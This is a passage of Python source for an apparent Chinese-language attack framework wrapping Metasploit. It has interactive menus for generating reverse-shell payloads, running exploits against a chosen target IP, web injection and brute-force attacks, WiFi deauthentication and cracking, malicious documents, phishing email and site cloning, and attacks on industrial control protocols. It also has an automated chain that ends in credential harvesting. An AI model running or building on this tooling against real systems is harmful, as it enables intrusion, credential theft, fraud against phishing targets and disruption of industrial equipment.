        except sqlite3.Error as e:
            logger.error(f"创建目标组失败: {e}")
            return False
    
    def get_target_groups(self):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM target_groups")
            
            groups = []
            for row in cursor.fetchall():
                group = {
                    'id': row[0],
                    'name': row[1],
                    'description': row[2],
                    'targets': json.loads(row[3]) if row[3] else [],
                    'created_at': row[4]
                }
                groups.append(group)
            
            conn.close()
            return groups
        except sqlite3.Error as e:
            logger.error(f"获取目标组失败: {e}")
            return []
    
    def save_scan_results(self, target_id, scan_type, results):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "INSERT INTO scan_results (target_id, scan_type, results_json) VALUES (?, ?, ?)", 
                (
                    target_id,
                    scan_type,
                    json.dumps(results)
                )
            )
            
            conn.commit()
            conn.close()
            
            return True
        except sqlite3.Error as e:
            logger.error(f"保存扫描结果失败: {e}")
            return False
    
    def get_scan_results(self, target_id=None, scan_type=None):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            if target_id and scan_type:
                cursor.execute("SELECT * FROM scan_results WHERE target_id = ? AND scan_type = ?", (target_id, scan_type))
            elif target_id:
                cursor.execute("SELECT * FROM scan_results WHERE target_id = ?", (target_id,))
            elif scan_type:
                cursor.execute("SELECT * FROM scan_results WHERE scan_type = ?", (scan_type,))
            else:
                cursor.execute("SELECT * FROM scan_results")
            
            results = []
            for row in cursor.fetchall():
                result = {
                    'id': row[0],
                    'target_id': row[1],
                    'scan_type': row[2],
                    'results': json.loads(row[3]) if row[3] else {},
                    'timestamp': row[4]
                }
                results.append(result)
            
            conn.close()
            return results
        except sqlite3.Error as e:
            logger.error(f"获取扫描结果失败: {e}")
            return []

class UltimateMSFController:

    def __init__(self):
        self.author = "Alfadi联盟 - XiaoYao"
        self.github_url = "https://github.com/ADA-XiaoYao/msfvenom.git"
        self.version = "4.0 Complete"
        
        self.module_manager = MSFModuleManager()
        self.payload_generator = UltimatePayloadGenerator(self.module_manager)
        self.exploit_manager = ExploitManager(self.module_manager)
        self.web_penetration = WebPenetrationManager(self.module_manager)
        self.database_attacker = DatabaseAttackManager(self.module_manager)
        self.wireless_attacker = WirelessAttackManager(self.module_manager)
        self.social_engineer = SocialEngineeringManager(self.module_manager)
        self.mobile_attacker = MobileAttackManager(self.module_manager)
        self.ics_attacker = ICSAttackManager(self.module_manager)
        self.cloud_attacker = CloudAttackManager(self.module_manager)
        self.post_exploit = PostExploitationManager(self.module_manager)
        self.scanner = AdvancedScanner(self.module_manager)
        self.session_mgr = SessionManager(self.module_manager)
        self.report_generator = ReportGenerator()
        self.target_manager = TargetManager()
        
        self.load_config()
    
    def load_config(self):
        
        self.config_file = "ultimate_msf_config.json"
        default_config = {
            "author": self.author,
            "github": self.github_url,
            "version": self.version,
            "scan_settings": {
                "threads": 10,
                "timeout": 5,
                "ports": "1-1000"
            },
            "payload_settings": {
                "default_lhost": "192.168.1.100",
                "default_lport": "4444",
                "auto_migrate": True
            },
            "web_attack": {
                "user_agents": [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                ]
            },
            "report_settings": {
                "company_name": "Alfadi联盟",
                "tester_name": "XiaoYao",
                "report_format": "html"
            }
        }
        
        try:
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            self.config = default_config
            self.save_config()
    
    def save_config(self):
        
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
    
    def display_banner(self):
        
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                           终极MSFVenom工具                                     ║
║                        Alfadi联盟 - XiaoYao                                   ║
║                  高级渗透测试与漏洞利用框架                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def display_statistics(self):
        
        stats = self.module_manager.get_module_statistics()
        
        print("\n" + "=" * 70)
        print("MSF模块统计信息")
        print("=" * 70)
        
        print("\n模块类型分布:")
        print("-" * 40)
        for module_type, count in stats['by_type'].items():
            print(f"  {module_type:12}: {count:4} 个模块")
        
        print(f"\n总计模块数: {sum(stats['by_type'].values())}")
        
        print(f"\n平台分布 (前10):")
        print("-" * 40)
        for platform, count in sorted(stats['by_platform'].items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {platform:12}: {count:4} 个模块")
        
        print(f"\n模块等级分布:")
        print("-" * 40)
        for rank, count in sorted(stats['by_rank'].items(), key=lambda x: ['excellent', 'great', 'good', 'normal', 'average', 'low', 'manual'].index(x[0])):
            print(f"  {rank:12}: {count:4} 个模块")
    
    def update_all_modules(self):
        
        print("\n开始更新所有MSF模块...")
        print("这可能需要几分钟时间，请耐心等待...")
        
        module_types = [
            "exploits", "payloads", "auxiliary", "post", 
            "encoders", "nops", "evasion"
        ]
        
        total_modules = 0
        for module_type in module_types:
            modules = self.module_manager.get_msf_modules(module_type, force_update=True)
            if modules:
                total_modules += len(modules)
                print(f"  {module_type:12}: {len(modules):4} 个模块")
            time.sleep(2)
        
        print(f"\n✓ 所有模块更新完成! 共更新 {total_modules} 个模块")
    
    def run_full_penetration_test(self, target_ip):
        
        print(f"\n开始对 {target_ip} 进行完整渗透测试...")
        start_time = time.time()
        
        print("\n[阶段1] 信息收集...")
        print("  - 端口扫描...")
        scan_results = self.scanner.port_scan(target_ip)
        self.report_generator.add_scan_results(target_ip, "port_scan", scan_results)
        
        print("  - 服务检测...")
        service_results = self.scanner.service_detection(target_ip)
        self.report_generator.add_scan_results(target_ip, "service_detection", service_results)
        
        print("\n[阶段2] 漏洞扫描...")
        print("  - 漏洞扫描...")
        vuln_results = self.scanner.vulnerability_scan(target_ip)
        self.report_generator.add_scan_results(target_ip, "vulnerability_scan", vuln_results)
        
        print("\n[阶段3] 漏洞利用...")
        exploits = self.exploit_manager.search_exploits(min_rank="good")
        
        successful_exploits = 0
        for i, exploit in enumerate(exploits[:5]):
            print(f"  - 尝试利用 ({i+1}/5): {exploit['name']}")
            options = {
                "RHOST": target_ip,
                "LHOST": self.config["payload_settings"]["default_lhost"]
            }
            
            success, output = self.exploit_manager.execute_exploit(exploit['name'], options)
            self.report_generator.add_exploit_results(target_ip, exploit['name'], success, output)
            
            if success:
                print(f"    ✓ 利用成功!")
                successful_exploits += 1
                break
            else:
                print(f"    ✗ 利用失败")
        
        print("\n[阶段4] 后渗透利用...")
        sessions = self.session_mgr.list_sessions()
        
        if sessions:
            session_id = sessions[0]['id']
            print(f"  - 在会话 {session_id} 上执行后渗透...")
            
            print("    - 收集系统信息...")
            post_results = self.post_exploit.gather_system_info(session_id)
            self.report_generator.add_post_exploit_results(target_ip, session_id, post_results)
            
            print("    - 收集凭据...")
            credential_results = self.post_exploit.credential_harvesting(session_id)
            post_results.update(credential_results)
        else:
            print("  - 未建立会话，跳过此阶段")
        
        print("\n[阶段5] 生成报告...")
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"penetration_report_{target_ip}_{timestamp}.html"
        self.report_generator.generate_html_report(report_file)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n" + "=" * 70)
        print("渗透测试完成!")
        print(f"目标: {target_ip}")
        print(f"耗时: {duration:.2f} 秒")
        print(f"成功利用漏洞: {successful_exploits} 个")
        print(f"报告文件: {report_file}")
        print("=" * 70)
        
        return report_file
    
    def interactive_mode(self):
        
        while True:
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
            
            self.display_banner()
            self.display_statistics()
            
            print("\n主菜单:")
            print("┌────────────────────────────────────────────────────────────┐")
            print("│  1.  Payload生成               9.  云环境攻击              │")
            print("│  2.  漏洞利用                  10. 后渗透利用              │")
            print("│  3.  Web渗透                   11. 会话管理                │")
            print("│  4.  数据库攻击                12. 目标管理                │")
            print("│  5.  无线攻击                  13. 扫描工具                │")
            print("│  6.  社会工程学                14. 报告生成                │")
            print("│  7.  移动设备攻击              15. 更新模块                │")
            print("│  8.  ICS攻击                   16. 完整渗透测试            │")
            print("│                                0.  退出                    │")
            print("└────────────────────────────────────────────────────────────┘")
            
            choice = input("\n请选择功能 [0-16]: ").strip()
            
            if choice == "0":
                print("\n感谢使用终极MSFVenom工具! 再见!")
                break
            elif choice == "1":
                self._payload_generation_menu()
            elif choice == "2":
                self._exploit_menu()
            elif choice == "3":
                self._web_penetration_menu()
            elif choice == "4":
                self._database_attack_menu()
            elif choice == "5":
                self._wireless_attack_menu()
            elif choice == "6":
                self._social_engineering_menu()
            elif choice == "7":
                self._mobile_attack_menu()
            elif choice == "8":
                self._ics_attack_menu()
            elif choice == "9":
                self._cloud_attack_menu()
            elif choice == "10":
                self._post_exploitation_menu()
            elif choice == "11":
                self._session_management_menu()
            elif choice == "12":
                self._target_management_menu()
            elif choice == "13":
                self._scanning_tools_menu()
            elif choice == "14":
                self._report_generation_menu()
            elif choice == "15":
                self.update_all_modules()
                input("\n按回车键继续...")
            elif choice == "16":
                self._full_penetration_test_menu()
            else:
                print("无效选择，请重新输入!")
                input("\n按回车键继续...")

    def _payload_generation_menu(self):
        
        while True:
            print("\n" + "=" * 60)
            print("Payload生成")
            print("=" * 60)
            
            print("1. Windows Payload")
            print("2. Linux Payload")
            print("3. Android Payload")
            print("4. Web Payload (PHP/Python/Java)")
            print("5. 其他平台")
            print("6. 返回上级")
            
            choice = input("\n请选择平台: ").strip()
            
            if choice == "6":
                return
            
            platform_map = {
                "1": ("windows", "x64"),
                "2": ("linux", "x64"),
                "3": ("android", "dalvik"),
                "4": ("php", "php"),
                "5": ("custom", "custom")
            }
            
            if choice in platform_map:
                platform, arch = platform_map[choice]
                
                if choice == "5":
                    platform = input("输入平台 (windows/linux/osx/android/php/python/java): ").strip()
                    arch = input("输入架构 (x86/x64/armle/aarch64/dalvik): ").strip()
                
                self._generate_payload_for_platform(platform, arch)
            else:
                print("无效选择!")

    def _generate_payload_for_platform(self, platform, arch):
        
        payloads = self.payload_generator.get_supported_payloads(platform, arch)
        if not payloads:
            print(f"未找到 {platform} 平台的Payload")
            input("\n按回车键继续...")
            return
        
        print(f"\n{platform} 平台可用的Payload ({len(payloads)}个):")
        for i, payload in enumerate(payloads[:20]):
            print(f"{i+1:2d}. {payload['name']}")
        
        if len(payloads) > 20:
            print(f"... 还有 {len(payloads) - 20} 个Payload")
        
        try:
            payload_choice = input("\n选择Payload (序号): ").strip()
            if not payload_choice:
                return
                
            payload_index = int(payload_choice) - 1
            if 0 <= payload_index < len(payloads):
                selected_payload = payloads[payload_index]['name']
                
                print(f"\n选择的Payload: {selected_payload}")
                
                lhost = input(f"LHOST [{self.config['payload_settings']['default_lhost']}]: ").strip()
                lhost = lhost or self.config['payload_settings']['default_lhost']
                
                lport = input(f"LPORT [{self.config['payload_settings']['default_lport']}]: ").strip()
                lport = lport or self.config['payload_settings']['default_lport']
                
                default_output = f"payload_{platform}_{int(time.time())}"
                if platform in ['windows', 'linux', 'osx']:
                    default_output += ".exe" if platform == 'windows' else ".bin"
                elif platform == 'android':
                    default_output += ".apk"
                elif platform in ['php', 'python', 'java']:
                    default_output += f".{platform}"
                
                output_file = input(f"输出文件 [{default_output}]: ").strip()
                output_file = output_file or default_output
                
                print("\n编码选项:")
                encoders = self.payload_generator.get_encoders()
                print("0. 不编码")
                for i, encoder in enumerate(encoders[:10]):
                    if encoder != "不选择编码器":
                        print(f"{i+1}. {encoder}")
                
                encoder_choice = input("选择编码器 [0]: ").strip() or "0"
                if encoder_choice == "0":
                    encoder = None
                    iterations = 1
                else:
                    try:
                        encoder_index = int(encoder_choice) - 1
                        if 0 <= encoder_index < len(encoders) - 1:
                            encoder = encoders[encoder_index + 1]
                            iterations = input("迭代次数 [1]: ").strip() or "1"
                            iterations = int(iterations)
                        else:
                            print("无效选择，使用默认设置")
                            encoder = None
                            iterations = 1
                    except ValueError:
                        print("无效输入，使用默认设置")
                        encoder = None
                        iterations = 1
                
                output_format = "exe" if platform == 'windows' else "raw"
                if platform == 'android':
                    output_format = "apk"
                elif platform in ['php', 'python', 'java']:
                    output_format = platform
                
                cmd = self.payload_generator.generate_payload(
                    platform, arch, selected_payload, lhost, lport, 
                    output_format, output_file, encoder, iterations
                )
                
                print(f"\n生成的命令:")
                print(" ".join(cmd))
                
                confirm = input("\n是否执行? (y/n): ").strip().lower()
                if confirm == 'y':
                    print("正在生成Payload...")
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        print(f"✓ Payload生成成功: {output_file}")
                        
                        valid, info = self.payload_generator.validate_payload_file(output_file)
                        if valid:
                            print(f"✓ 文件验证通过")
                            print(f"  大小: {info['size']} bytes")
                            print(f"  MD5: {info['md5']}")
                        
                        handler_file = self.payload_generator.generate_handler_script(
                            selected_payload, lhost, lport, output_file
                        )
                        print(f"✓ Handler脚本已生成: {handler_file}")
                        
                        self.report_generator.add_payload_info(
                            f"Generated_{platform}", selected_payload, lhost, lport, output_file
                        )
                    else:
                        print(f"✗ 生成失败: {result.stderr}")
                else:
                    print("操作取消")
            else:
                print("无效的Payload选择")
        except ValueError:
            print("请输入有效数字")
        except KeyboardInterrupt:
            print("\n操作取消")
        
        input("\n按回车键继续...")

    def _exploit_menu(self):
        
        print("\n" + "=" * 60)
        print("漏洞利用")
        print("=" * 60)
        
        print("1. 搜索漏洞")
        print("2. Windows漏洞")
        print("3. Linux漏洞")
        print("4. Web应用漏洞")
        print("5. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "5":
            return
        
        if choice == "1":
            query = input("搜索关键词: ").strip()
            exploits = self.exploit_manager.search_exploits(query)
        elif choice == "2":
            exploits = self.exploit_manager.search_exploits("windows", min_rank="good")
        elif choice == "3":
            exploits = self.exploit_manager.search_exploits("linux", min_rank="good")
        elif choice == "4":
            exploits = self.exploit_manager.search_exploits("http", min_rank="good")
        else:
            print("无效选择")
            input("\n按回车键继续...")
            return
        
        if not exploits:
            print("未找到相关漏洞")
            input("\n按回车键继续...")
            return
        
        print(f"\n找到 {len(exploits)} 个漏洞:")
        for i, exploit in enumerate(exploits[:15]):
            print(f"{i+1:2d}. {exploit['name']} ({exploit['rank']})")
            print(f"     {exploit['description'][:80]}...")
        
        try:
            exploit_choice = input("\n选择漏洞 (序号): ").strip()
            if not exploit_choice:
                return
                
            exploit_index = int(exploit_choice) - 1
            if 0 <= exploit_index < len(exploits):
                selected_exploit = exploits[exploit_index]
                
                print(f"\n选择的漏洞: {selected_exploit['name']}")
                print(f"描述: {selected_exploit['description']}")
                print(f"等级: {selected_exploit['rank']}")
                if selected_exploit['disclosure_date']:
                    print(f"披露日期: {selected_exploit['disclosure_date']}")
                
                rhost = input("目标IP (RHOST): ").strip()
                if not rhost:
                    print("必须指定目标IP")
                    input("\n按回车键继续...")
                    return
                
                lhost = input(f"监听IP (LHOST) [{self.config['payload_settings']['default_lhost']}]: ").strip()
                lhost = lhost or self.config['payload_settings']['default_lhost']
                
                if selected_exploit['options']:
                    print("\n必要选项:")
                    required_options = []
                    for opt_name, opt_info in selected_exploit['options'].items():
                        if opt_info.get('required') == 'yes':
                            print(f"  {opt_name}: {opt_info.get('description', '')}")
                            required_options.append(opt_name)
                    
                    print("\n设置选项 (留空使用默认值):")
                    options = {
                        "RHOST": rhost,
                        "LHOST": lhost
                    }
                    
                    for opt_name in required_options:
                        if opt_name not in ["RHOST", "LHOST"]:
                            value = input(f"{opt_name}: ").strip()
                            if value:
                                options[opt_name] = value
                else:
                    options = {
                        "RHOST": rhost,
                        "LHOST": lhost
                    }
                
                print(f"\n正在执行漏洞利用...")
                success, output = self.exploit_manager.execute_exploit(selected_exploit['name'], options)
                
                if success:
                    print("✓ 漏洞利用执行成功!")
                    if output and len(output) > 0:
                        print(f"输出: {output[:500]}...")
                    
                    self.report_generator.add_exploit_results(rhost, selected_exploit['name'], True, output)
                else:
                    print(f"✗ 漏洞利用失败: {output}")
                    self.report_generator.add_exploit_results(rhost, selected_exploit['name'], False, output)
            else:
                print("无效的漏洞选择")
        except ValueError:
            print("请输入有效数字")
        except KeyboardInterrupt:
            print("\n操作取消")
        
        input("\n按回车键继续...")

    def _web_penetration_menu(self):
        
        print("\n" + "=" * 60)
        print("Web渗透")
        print("=" * 60)
        
        print("1. Web应用扫描")
        print("2. SQL注入检测")
        print("3. XSS检测")
        print("4. 文件包含检测")
        print("5. 命令注入检测")
        print("6. 暴力破解登录")
        print("7. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "7":
            return
        
        target_url = input("目标URL: ").strip()
        if not target_url:
            print("必须指定目标URL")
            input("\n按回车键继续...")
            return
        
        try:
            if choice == "1":
                print("正在扫描Web应用...")
                results = self.web_penetration.scan_web_application(target_url)
                
                print("\n扫描结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "2":
                print("正在检测SQL注入...")
                results = self.web_penetration.sql_injection_attack(target_url, {})
                
                print("\nSQL注入检测结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "3":
                print("正在检测XSS漏洞...")
                payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
                results = self.web_penetration.xss_attack(target_url, payloads)
                
                print("\nXSS检测结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "4":
                print("正在检测文件包含漏洞...")
                results = self.web_penetration.file_inclusion_attack(target_url)
                
                print("\n文件包含检测结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "5":
                print("正在检测命令注入漏洞...")
                results = self.web_penetration.command_injection_attack(target_url)
                
                print("\n命令注入检测结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "6":
                print("正在暴力破解...")
                usernames = ["admin", "test", "user", "root"]
                passwords = ["admin", "password", "123456", "root"]
                results = self.web_penetration.brute_force_login(target_url, usernames, passwords)
                
                print("\n暴力破解结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            else:
                print("无效选择")
            
            target_host = urlparse(target_url).hostname
            self.report_generator.add_scan_results(target_host, f"web_{choice}", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _database_attack_menu(self):
        
        print("\n" + "=" * 60)
        print("数据库攻击")
        print("=" * 60)
        
        print("1. MySQL攻击")
        print("2. MSSQL攻击")
        print("3. Oracle攻击")
        print("4. PostgreSQL攻击")
        print("5. MongoDB攻击")
        print("6. 返回上级")
        
        choice = input("\n请选择数据库类型: ").strip()
        
        if choice == "6":
            return
        
        db_types = {
            "1": "mysql",
            "2": "mssql", 
            "3": "oracle",
            "4": "postgresql",
            "5": "mongodb"
        }
        
        if choice not in db_types:
            print("无效选择")
            input("\n按回车键继续...")
            return
        
        db_type = db_types[choice]
        target_ip = input("数据库服务器IP: ").strip()
        if not target_ip:
            print("必须指定目标IP")
            input("\n按回车键继续...")
            return
            
        port = input(f"端口 [{self._get_default_db_port(db_type)}]: ").strip()
        port = port or self._get_default_db_port(db_type)
        
        print("\n攻击选项:")
        print("1. 暴力破解")
        print("2. 数据库枚举")
        print("3. 漏洞利用")
        print("4. 返回")
        
        attack_choice = input("请选择攻击方式: ").strip()
        
        if attack_choice == "4":
            return
        
        try:
            if attack_choice == "1":
                print("正在执行暴力破解...")
                username_list = input("用户名列表 (逗号分隔，留空使用默认): ").strip()
                password_list = input("密码列表 (逗号分隔，留空使用默认): ").strip()
                
                usernames = [u.strip() for u in username_list.split(",")] if username_list else None
                passwords = [p.strip() for p in password_list.split(",")] if password_list else None
                
                results = self.database_attacker.database_brute_force(target_ip, port, db_type, usernames, passwords)
            
            elif attack_choice == "2":
                username = input("用户名: ").strip()
                password = input("密码: ").strip()
                print("正在执行数据库枚举...")
                results = self.database_attacker.database_enumeration(target_ip, port, db_type, username, password)
            
            elif attack_choice == "3":
                username = input("用户名: ").strip()
                password = input("密码: ").strip()
                print("正在执行漏洞利用...")
                results = self.database_attacker.database_exploitation(target_ip, port, db_type, username, password)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n攻击结果:")
            for module, result in results.items():
                if "error" in result:
                    print(f"✗ 错误: {result['error']}")
                else:
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
                    if result['output']:
                        print(f"  输出: {result['output'][:200]}...")
            
            self.report_generator.add_scan_results(target_ip, f"db_{db_type}_{attack_choice}", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")
    
    def _get_default_db_port(self, db_type):
        
        ports = {
            "mysql": "3306",
            "mssql": "1433", 
            "oracle": "1521",
            "postgresql": "5432",
            "mongodb": "27017"
        }
        return ports.get(db_type, "3306")

    def _wireless_attack_menu(self):
        
        print("\n" + "=" * 60)
        print("无线攻击")
        print("=" * 60)
        
        print("1. WiFi扫描")
        print("2. WiFi取消认证攻击")
        print("3. WiFi密码破解")
        print("4. 蓝牙攻击")
        print("5. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "5":
            return
        
        try:
            interface = input("无线网卡接口 [wlan0]: ").strip() or "wlan0"
            
            if choice == "1":
                print("正在扫描WiFi网络...")
                results = self.wireless_attacker.wifi_scanning(interface)
            
            elif choice == "2":
                bssid = input("目标BSSID: ").strip()
                if not bssid:
                    print("必须指定BSSID")
                    input("\n按回车键继续...")
                    return
                    
                count = input("攻击次数 [10]: ").strip() or "10"
                print("正在执行取消认证攻击...")
                results = self.wireless_attacker.wifi_deauth_attack(bssid, interface, int(count))
            
            elif choice == "3":
                bssid = input("目标BSSID: ").strip()
                channel = input("信道: ").strip()
                if not bssid or not channel:
                    print("必须指定BSSID和信道")
                    input("\n按回车键继续...")
                    return
                    
                print("正在尝试破解密码...")
                results = self.wireless_attacker.wifi_cracking(bssid, channel, interface)
            
            elif choice == "4":
                bdaddr = input("目标蓝牙地址: ").strip()
                if not bdaddr:
                    print("必须指定蓝牙地址")
                    input("\n按回车键继续...")
                    return
                    
                print("正在执行蓝牙攻击...")
                results = self.wireless_attacker.bluetooth_attack(bdaddr)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n攻击结果:")
            for module, result in results.items():
                status = "✓ 成功" if result['success'] else "✗ 失败"
                print(f"{module}: {status}")
                if result['output']:
                    print(f"  输出: {result['output'][:200]}...")
            
            target_id = f"wireless_{choice}"
            self.report_generator.add_scan_results(target_id, "wireless_attack", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _social_engineering_menu(self):
        
        print("\n" + "=" * 60)
        print("社会工程学攻击")
        print("=" * 60)
        
        print("1. 创建恶意文档")
        print("2. 钓鱼邮件攻击")
        print("3. 网站克隆")
        print("4. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "4":
            return
        
        try:
            if choice == "1":
                print("\n恶意文档类型:")
                print("1. PDF文档")
                print("2. Word文档") 
                print("3. Excel文档")
                print("4. 可执行文件")
                print("5. 返回")
                
                file_choice = input("请选择: ").strip()
                file_types = {"1": "pdf", "2": "doc", "3": "xls", "4": "exe"}
                
                if file_choice == "5":
                    return
                    
                if file_choice not in file_types:
                    print("无效选择")
                    input("\n按回车键继续...")
                    return
                
                file_type = file_types[file_choice]
                payload = input("Payload [windows/meterpreter/reverse_tcp]: ").strip() or "windows/meterpreter/reverse_tcp"
                
                default_output = f"malicious_document_{file_type}_{int(time.time())}.{file_type}"
                output_file = input(f"输出文件名 [{default_output}]: ").strip() or default_output
                
                print("正在创建恶意文件...")
                success, message = self.social_engineer.create_malicious_file(file_type, payload, output_file)
                
                if success:
                    print(f"✓ {message}")
                    
                    lhost = input(f"监听IP [{self.config['payload_settings']['default_lhost']}]: ").strip() or self.config['payload_settings']['default_lhost']
                    lport = input(f"监听端口 [{self.config['payload_settings']['default_lport']}]: ").strip() or self.config['payload_settings']['default_lport']
                    
                    handler_file = self.payload_generator.generate_handler_script(payload, lhost, lport, output_file)
                    print(f"✓ Handler脚本已生成: {handler_file}")
                    
                    self.report_generator.add_payload_info(f"SE_{file_type}", payload, lhost, lport, output_file)
                else:
                    print(f"✗ {message}")
            
            elif choice == "2":
                target_email = input("目标邮箱: ").strip()
                subject = input("邮件主题: ").strip()
                body = input("邮件内容: ").strip()
                
                if not target_email:
                    print("必须指定目标邮箱")
                    input("\n按回车键继续...")
                    return
                
                print("正在发送钓鱼邮件...")
                results = self.social_engineer.phishing_attack(target_email, subject, body)
                
                print("\n钓鱼邮件结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
            
            elif choice == "3":
                target_url = input("要克隆的网站URL: ").strip()
                local_port = input("本地端口 [80]: ").strip() or "80"
                
                if not target_url:
                    print("必须指定目标URL")
                    input("\n按回车键继续...")
                    return
                
                print("正在克隆网站...")
                results = self.social_engineer.website_cloning(target_url, int(local_port))
                
                print("\n网站克隆结果:")
                for module, result in results.items():
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
                    
                if results and any(result['success'] for result in results.values()):
                    print(f"\n克隆网站已启动，访问: http://localhost:{local_port}")
            
            else:
                print("无效选择")
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _mobile_attack_menu(self):
        
        print("\n" + "=" * 60)
        print("移动设备攻击")
        print("=" * 60)
        
        print("1. Android攻击")
        print("2. iOS攻击")
        print("3. 创建移动Payload")
        print("4. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "4":
            return
        
        try:
            lhost = input(f"监听IP [{self.config['payload_settings']['default_lhost']}]: ").strip()
            lhost = lhost or self.config['payload_settings']['default_lhost']
            lport = input(f"监听端口 [{self.config['payload_settings']['default_lport']}]: ").strip()
            lport = lport or self.config['payload_settings']['default_lport']
            
            if choice == "1":
                print("正在准备Android攻击...")
                payload_options = {
                    "LHOST": lhost, 
                    "LPORT": lport,
                    "PAYLOAD": "android/meterpreter/reverse_tcp"
                }
                results = self.mobile_attacker.android_attack(lhost, payload_options)
            
            elif choice == "2":
                print("正在准备iOS攻击...")
                payload_options = {
                    "LHOST": lhost,
                    "LPORT": lport, 
                    "PAYLOAD": "apple_ios/aarch64/meterpreter_reverse_tcp"
                }
                results = self.mobile_attacker.ios_attack(lhost, payload_options)
            
            elif choice == "3":
                print("\n选择平台:")
                print("1. Android")
                print("2. iOS")
                print("3. 返回")
                
                platform_choice = input("请选择: ").strip()
                platforms = {"1": "android", "2": "ios"}
                
                if platform_choice == "3":
                    return
                    
                if platform_choice not in platforms:
                    print("无效选择")
                    input("\n按回车键继续...")
                    return
                
                platform = platforms[platform_choice]
                default_output = f"mobile_payload_{platform}_{int(time.time())}"
                if platform == "android":
                    default_output += ".apk"
                else:
                    default_output += ".ipa"
                    
                output_file = input(f"输出文件名 [{default_output}]: ").strip() or default_output
                
                print("正在创建移动Payload...")
                success, message = self.mobile_attacker.create_mobile_payload(platform, lhost, lport, output_file)
                
                if success:
                    print(f"✓ {message}")
                    
                    handler_file = self.payload_generator.generate_handler_script(
                        f"{platform}/meterpreter/reverse_tcp", lhost, lport, output_file
                    )
                    print(f"✓ Handler脚本已生成: {handler_file}")
                    
                    self.report_generator.add_payload_info(f"Mobile_{platform}", f"{platform}/meterpreter/reverse_tcp", lhost, lport, output_file)
                else:
                    print(f"✗ {message}")
                
                input("\n按回车键继续...")
                return
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n攻击结果:")
            for module, result in results.items():
                status = "✓ 成功" if result['success'] else "✗ 失败"
                print(f"{module}: {status}")
                if result['output']:
                    print(f"  输出: {result['output'][:200]}...")
            
            target_id = f"mobile_{choice}"
            self.report_generator.add_scan_results(target_id, "mobile_attack", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _ics_attack_menu(self):
        
        print("\n" + "=" * 60)
        print("工业控制系统攻击")
        print("=" * 60)
        
        print("1. Modbus协议攻击")
        print("2. 西门子S7协议攻击")
        print("3. Profinet协议攻击")
        print("4. DNP3协议攻击")
        print("5. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "5":
            return
        
        target_ip = input("目标IP: ").strip()
        if not target_ip:
            print("必须指定目标IP")
            input("\n按回车键继续...")
            return
        
        try:
            if choice == "1":
                port = input("端口 [502]: ").strip() or "502"
                print("正在执行Modbus协议攻击...")
                results = self.ics_attacker.modbus_attack(target_ip, int(port))
            
            elif choice == "2":
                port = input("端口 [102]: ").strip() or "102"
                print("正在执行S7协议攻击...")
                results = self.ics_attacker.siemens_s7_attack(target_ip, int(port))
            
            elif choice == "3":
                port = input("端口 [34964]: ").strip() or "34964"
                print("正在执行Profinet协议攻击...")
                results = self.ics_attacker.profinet_attack(target_ip, int(port))
            
            elif choice == "4":
                port = input("端口 [20000]: ").strip() or "20000"
                print("正在执行DNP3协议攻击...")
                results = self.ics_attacker.dnp3_attack(target_ip, int(port))
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n攻击结果:")
            for module, result in results.items():
                status = "✓ 成功" if result['success'] else "✗ 失败"
                print(f"{module}: {status}")
                if result['output']:
                    print(f"  输出: {result['output'][:200]}...")
            
